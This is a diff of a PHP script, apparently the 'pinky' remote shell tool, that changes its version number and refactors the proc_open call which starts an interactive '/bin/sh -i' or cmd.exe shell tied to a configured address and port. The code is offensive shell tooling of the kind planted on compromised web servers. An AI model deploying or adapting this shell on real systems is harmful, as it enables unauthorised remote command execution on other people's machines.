@@ -1,7 +1,7 @@
 <?php
 set_time_limit(0);
 
-$version = "0.1";
+$version = "0.2";
 $author = "David Tavarez (davidtavarez)";
 $url = "https://davidtavarez.github.io/pinky/";
 
@@ -19,21 +19,6 @@ $path = realpath(NULL) . '/';
 $tmp_path = $path;
 $os = null;
 $shell = null;
-
-$descriptorspec = array(
-    array(
-        'pipe',
-        'r'
-    ),
-    array(
-        'pipe',
-        'w'
-    ),
-    array(
-        'pipe',
-        'w'
-    )
-);
 
 $address = '127.0.0.1';
 $port = 3391;
@@ -119,11 +104,24 @@ if (! $session) {
     // Start the session.
     echo "Starting shell... ";
     if ($os === 'WIN') {
-        $shell = "C:\\Windows\\System32\\cmd.exe"; 
+        $shell = "C:\\Windows\\System32\\cmd.exe";
     } else {
-        $shell = '/bin/sh -i'; 
+        $shell = '/bin/sh -i';
     }
-    $process = proc_open($shell, $descriptorspec, $pipes, $path, null);
+    $process = proc_open($shell, array(
+        array(
+            'pipe',
+            'r'
+        ),
+        array(
+            'pipe',
+            'w'
+        ),
+        array(
+            'pipe',
+            'w'
+        )
+    ), $pipes, $path, null);
     $process_status = proc_get_status($process);
     echo "Ok.\n";
     
